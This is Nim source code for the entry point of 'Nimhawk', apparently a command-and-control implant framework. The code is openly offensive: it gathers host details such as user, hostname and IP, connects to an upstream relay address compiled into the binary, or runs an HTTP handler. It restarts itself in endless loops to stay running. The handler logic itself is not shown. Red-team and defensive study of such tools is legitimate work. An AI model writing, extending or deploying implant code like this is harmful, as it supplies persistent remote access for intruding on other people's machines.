proc runMultiImplant*() {.async.} =
    echo "=== Nimhawk Multi-Platform v1.5.0 - Dynamic Relay System ==="
    
    when defined debug:
        echo "[DEBUG] Debug mode enabled"
        echo "[DEBUG] PID: " & $getCurrentPID()
        echo "[DEBUG] Process: " & getCurrentProcessName()
        echo "[DEBUG] OS: " & getOSInfo()
        echo "[DEBUG] User: " & getUsername()
        echo "[DEBUG] Hostname: " & getSysHostname()
        echo "[DEBUG] Local IP: " & getLocalIP()
        echo "[DEBUG] Available relay commands:"
        echo "[DEBUG]   relay port 9999          - Start relay server on port 9999"
        echo "[DEBUG]   relay connect relay://ip:port - Connect to upstream relay"
        echo "[DEBUG]   relay status             - Show relay status"
        echo "[DEBUG]   relay stop               - Stop relay server"
        echo "[DEBUG]   relay disconnect         - Disconnect from upstream"
        echo "[DEBUG] "
        echo "[DEBUG] Relay client build with FAST_MODE:"
        echo "[DEBUG]   make darwin_arm64 RELAY_ADDRESS=relay://ip:port FAST_MODE=1 DEBUG=1"
        echo "[DEBUG] "
        echo "[DEBUG] Current client mode: " & (if CLIENT_FAST_MODE: "FAST_MODE" else: "NORMAL")
        echo "[DEBUG] Server adaptive mode: " & (if g_serverFastMode: "FAST (1s)" else: "NORMAL (2s)")
    
    # Check if compiled as relay client
    when defined(RELAY_MODE):
        const RELAY_ADDR {.strdefine.}: string = ""
        
        when defined debug:
            echo "[DEBUG] RELAY MODE - Compiled as relay client"
            echo "[DEBUG] Target relay address: " & RELAY_ADDR
        
        if RELAY_ADDR != "":
            # Parse relay address - strip quotes if present
            let cleanRelayAddr = RELAY_ADDR.strip(chars = {'"'})
            when defined debug:
                echo "[DEBUG] Cleaned relay address: " & cleanRelayAddr
            
            if cleanRelayAddr.startsWith("relay://"):
                let urlParts = cleanRelayAddr[8..^1].split(":")
                if urlParts.len == 2:
                    try:
                        let host = urlParts[0]
                        let port = parseInt(urlParts[1])
                        
                        when defined debug:
                            echo "[DEBUG] Connecting to relay server: " & host & ":" & $port
                        
                        # Connect to upstream relay
                        let result = connectToUpstreamRelay(host, port)
                        
                        when defined debug:
                            echo "[DEBUG] Relay connection result: " & result
                        
                        if upstreamRelay.isConnected:
                            when defined debug:
                                echo "[DEBUG] ✅ Successfully connected to relay. Entering relay client mode."
                                echo "[DEBUG] 🔗 RELAY CLIENT MODE ACTIVATED"
                                echo "[DEBUG] 📡 Listening for commands from relay server..."
                            
                            # Relay client main loop with safe restart mechanism
                            while true:
                                try:
                                    when defined debug:
                                        echo "[MAIN] 🚀 Starting relay client handler (safe mode)"
                                    
                                    await safeRelayClientHandler(host, port)
                                    
                                    when defined debug:
                                        echo "[MAIN] 🔄 Relay client handler ended, restarting in 5 seconds..."
                                    
                                    await sleepAsync(5000)  # Wait before restart
                                except Exception as e:
                                    when defined debug:
                                        echo "[MAIN] 💥 Critical error in main relay loop: " & e.msg
                                    await sleepAsync(10000)  # Longer wait on critical error
                        else:
                            when defined debug:
                                echo "[DEBUG] Failed to connect to relay. Exiting."
                    except:
                        when defined debug:
                            echo "[DEBUG] Invalid relay address format"
                        return
                else:
                    when defined debug:
                        echo "[DEBUG] Invalid port format in relay URL"
                    return
            else:
                when defined debug:
                    echo "[DEBUG] Invalid relay URL format"
                return
        else:
            when defined debug:
                echo "[DEBUG] No relay address specified"
            return
    else:
        # Start HTTP handler only - relay server starts on demand via commands
        when defined debug:
            echo "[DEBUG] 🚀 Starting HTTP Handler (relay server on-demand only)"
        
        when defined debug:
            echo "[DEBUG] ✅ Starting async event loop"
            echo "[DEBUG] 🚀 Starting HTTP Handler..."
            echo "[DEBUG] ℹ️  Relay server will start when 'relay port' command is executed"
        
        # Start HTTP handler with safe restart mechanism
        when defined debug:
            echo "[DEBUG] ✅ Starting HTTP handler with safe restart"
            echo "[DEBUG] 🔄 Running main loop..."
        
        # Safe main loop for HTTP handler
        while true:
            try:
                when defined debug:
                    echo "[MAIN] 🚀 Starting HTTP handler (safe mode)"
                
                await safeHttpHandler()
                
                when defined debug:
                    echo "[MAIN] 🔄 HTTP handler ended, restarting in 5 seconds..."
                
                await sleepAsync(5000)  # Wait before restart
            except Exception as e:
                when defined debug:
                    echo "[MAIN] 💥 Critical error in main HTTP loop: " & e.msg
                await sleepAsync(10000)  # Longer wait on critical error

# Entry point
when isMainModule:
    when defined debug:
        echo "=== Nimhawk Multi-Platform v1.5.0 - Dynamic Relay System ==="
        echo "[DEBUG] Debug mode enabled"
        echo "[DEBUG] PID: " & $getCurrentProcessId()
        echo "[DEBUG] Process: " & getAppFilename().extractFilename()
        echo "[DEBUG] OS: " & hostOS & " " & hostCPU
        echo "[DEBUG] User: " & getEnv("USER", "unknown")
        echo "[DEBUG] Hostname: " & getEnv("HOSTNAME", getEnv("COMPUTERNAME", "unknown"))
        echo "[DEBUG] Local IP: " & getLocalIP()
        echo "[DEBUG] Available relay commands:"
        echo "[DEBUG]   relay port 9999          - Start relay server on port 9999"
        echo "[DEBUG]   relay connect relay://ip:port - Connect to upstream relay"
        echo "[DEBUG]   relay status             - Show relay status"
        echo "[DEBUG]   relay stop               - Stop relay server"
        echo "[DEBUG]   relay disconnect         - Disconnect from upstream"
        echo "[DEBUG] "
        echo "[DEBUG] Relay client build with FAST_MODE:"
        echo "[DEBUG]   make darwin_arm64 RELAY_ADDRESS=relay://ip:port FAST_MODE=1 DEBUG=1"
        echo "[DEBUG] "
        echo "[DEBUG] Current client mode: " & (if CLIENT_FAST_MODE: "FAST_MODE" else: "NORMAL")
        echo "[DEBUG] Server adaptive mode: " & (if g_serverFastMode: "FAST (1s)" else: "NORMAL (2s)")
    
    randomize()
    waitFor runMultiImplant() 